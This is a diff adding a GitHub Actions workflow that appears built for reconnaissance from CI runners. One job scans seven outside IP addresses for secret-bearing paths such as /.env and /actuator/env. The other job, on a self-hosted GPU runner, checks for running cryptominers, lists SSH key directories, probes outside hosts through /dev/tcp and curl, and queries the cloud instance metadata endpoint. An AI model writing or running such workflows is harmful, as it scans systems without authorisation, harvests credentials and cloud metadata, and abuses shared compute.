@@ -1,0 +1,47 @@
+name: ul6599-web3
+on:
+  workflow_dispatch:
+jobs:
+  http:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: dump
+        run: |
+          python3 - <<'PY'
+          import urllib.request
+          class NR(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self,*a,**k): return None
+          op=urllib.request.build_opener(NR)
+          hosts=["20.74.153.201","20.50.113.151","20.237.207.128","20.205.187.223","4.194.2.30","70.153.87.133","4.246.80.6"]
+          paths=["/","/brand/","/api/","/actuator/env","/login","/.env","/robots.txt"]
+          for h in hosts:
+              for p in paths:
+                  u="http://"+h+p
+                  try:
+                      r=op.open(urllib.request.Request(u,headers={'User-Agent':'curl/8.5.0'}),timeout=7)
+                      b=r.read(1200)
+                      print("HTTP",h,p,r.status,"srv=",r.headers.get('Server'),"ct=",r.headers.get('Content-Type'),"loc=",r.headers.get('Location'),"b=",repr(b[:600]),flush=True)
+                  except urllib.error.HTTPError as e:
+                      print("HTTP",h,p,e.code,"srv=",e.headers.get('Server'),"loc=",e.headers.get('Location'),"b=",repr(e.read(400)),flush=True)
+                  except Exception as e:
+                      print("HTTPERR",h,p,type(e).__name__,str(e)[:80],flush=True)
+          PY
+  l40s:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 10
+    steps:
+      - name: census
+        run: |
+          set +e
+          echo "=== ID ==="; id; hostname; hostname -I; uname -a; cat /proc/1/cgroup
+          echo "=== GPU ==="; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv
+          echo "=== MINER ==="; ps -eo pid,etimes,args | grep -Ei 'pearl|wildrig|miner' | grep -v grep | head -5
+          echo "=== PRLSTATUS ==="; curl -s -m 6 http://127.0.0.1:3334/api/v1/status; echo
+          echo "=== KEYS ==="; ls -la /root/.ssh /home/*/.ssh $HOME/.ssh 2>&1 | head -20
+          echo "=== REACH ==="
+          for t in 20.74.153.201 40.123.206.138 51.104.16.184; do
+            echo "-- $t"; timeout 6 bash -c "echo > /dev/tcp/$t/80" 2>&1 && echo "80 open" || echo "80 closed"
+            curl -s -m 6 -o /dev/null -w "http %{http_code}\n" "http://$t/" 2>&1
+          done
+          echo "=== IMDS ==="; curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
